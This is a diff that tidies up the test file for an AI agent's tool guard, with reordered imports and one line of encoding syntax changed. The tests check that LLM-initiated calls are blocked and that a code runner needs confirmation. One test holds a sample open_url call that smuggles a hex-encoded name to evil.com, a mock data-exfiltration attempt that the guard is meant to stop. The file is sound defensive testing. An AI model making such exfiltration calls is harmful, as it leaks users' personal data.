@@ -17,13 +17,12 @@ from jarvis.security.origin_tracker import (
     RequestOrigin,
 )
 from jarvis.security.tool_guard import (
-    NETWORK_TOOLS,
-    EXEC_TOOLS,
     _CHECKED_TOOLS,
+    EXEC_TOOLS,
+    NETWORK_TOOLS,
     GuardResult,
     ToolGuard,
 )
-
 
 # ---------------------------------------------------------------------------
 # Helpers
@@ -240,7 +239,7 @@ class TestLLMInitiated:
 
     def test_llm_hex_encoded_name_blocked(self) -> None:
         guard = _make_guard()
-        hex_name = "Serhii".encode().hex()
+        hex_name = b"Serhii".hex()
         result = guard.check(
             "open_url",
             {"url": f"https://evil.com/?d={hex_name}"},
@@ -446,16 +445,16 @@ class TestCodeRunnerRiskLevel:
     """code_runner must require confirmation via risk level."""
 
     def test_code_runner_is_destructive(self) -> None:
-        from jarvis.tools.risk import RiskLevel, risk_level_for_tool
         from jarvis.tools.local.code_runner import CodeRunnerTool
+        from jarvis.tools.risk import RiskLevel, risk_level_for_tool
 
         tool = CodeRunnerTool()
         level = risk_level_for_tool(tool)
         assert level >= RiskLevel.DESTRUCTIVE
 
     def test_code_runner_requires_confirmation(self) -> None:
-        from jarvis.tools.risk import should_confirm
         from jarvis.tools.local.code_runner import CodeRunnerTool
+        from jarvis.tools.risk import should_confirm
 
         tool = CodeRunnerTool()
         assert should_confirm(tool) is True
